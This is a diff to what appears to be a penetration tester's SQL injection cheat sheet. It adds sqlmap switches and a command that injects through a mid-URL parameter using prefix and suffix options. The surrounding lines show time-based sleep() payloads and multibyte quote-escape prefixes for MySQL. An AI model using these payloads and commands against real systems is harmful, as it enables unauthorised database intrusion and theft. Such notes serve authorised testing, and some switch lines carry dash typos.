@@ -5,6 +5,13 @@ Use Prefix and Suffix for more challenging attacks
 # Example Chinese char set https://www.fileformat.info/info/charset/GBK/list.htm
 sqlmap -r ./sqlmap-03.txt --level=5 --risk=3 --batch --prefix=%bf%27 --dbms=mysql
 ```
+Useful Switches
+----------------
+```
+–-crawl=4 (depth of pages to crawl)
+--proxy=http://127.0.0.1:8080
+–identify-waf
+
 
 SQLite sample 
 -------------
@@ -55,13 +62,18 @@ SQLInjection Basic Stuff
 '%2b(select*from(select(sleep(20)))a)%2b'%bf%27
 '+(select*from(select(sleep(5)))a)+'
 ```
-Interesting items that can be used to prefix attacks
+Interesting items that can be used to prefix and suffix attacks
 ---------------------
 ```
 prefix='('
-prefix='\xBF''
+prefix='\xBF'''
 prefix='%bf%27'
 prefix=''''
+# Attack using the middle of the url
+sqlmap.py -p host -u "example.com?host=" --prefix "http://anotherexample.com?bar=1" --suffix "&restoftheurl=whatever"
+
+
+
 ```
 Sqlmap quick cheat sheet
 -------------
